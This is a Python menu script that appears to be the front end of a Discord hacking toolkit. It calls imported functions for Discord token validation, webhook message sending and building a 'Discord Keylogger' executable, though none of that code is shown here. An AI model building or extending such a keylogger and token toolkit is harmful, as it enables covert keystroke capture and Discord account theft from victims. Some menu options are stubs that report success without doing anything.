import os
from dotenv import load_dotenv
import datetime
import logging
import time
import random
from services.gui import banner  # banner function from gui.py
from colorama import Fore, Style, init
import pystyle
from services.keylogger import create_keylogger_exe
from services.tokenvalidator import validate_token
from services.webhooksender import *
# Initialize colorama for colored output
init(autoreset=True)

# load .env file
load_dotenv()

def main():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')  # clear the console
        banner()  # banner function from gui.py
        choice = input(f"{Fore.YELLOW}[?] Enter your choice: {Style.RESET_ALL}").strip()

        if choice == "1":
            validate_token()
            print(f"{Fore.GREEN}Token validation completed.{Style.RESET_ALL}")
            time.sleep(2)
            main()
        elif choice == "2":
            send_webhook()
            print(f"{Fore.GREEN}Webhook messages sent successfully.{Style.RESET_ALL}")
            time.sleep(2)
            main()
        elif choice == "3":
            #discord_bot_tester()
            print(f"{Fore.GREEN}Discord bot test completed.{Style.RESET_ALL}")
            time.sleep(2)
            main()
        elif choice == "4":
            #qr_code_generator()
            print(f"{Fore.GREEN}QR Code generated successfully.{Style.RESET_ALL}")
            time.sleep(2)
            main()
        elif choice == "5":
            print(f"{Fore.GREEN}Discord Keylogger started successfully.{Style.RESET_ALL}")
            create_keylogger_exe()
        elif choice == "6":
            print(f"{Fore.GREEN}Exiting... Bye!{Style.RESET_ALL}")
            exit(0)
        else:
            print(f"{Fore.RED}Invalid choice, please try again.{Style.RESET_ALL}")
            time.sleep(1.5)

if __name__ == "__main__":
    main()
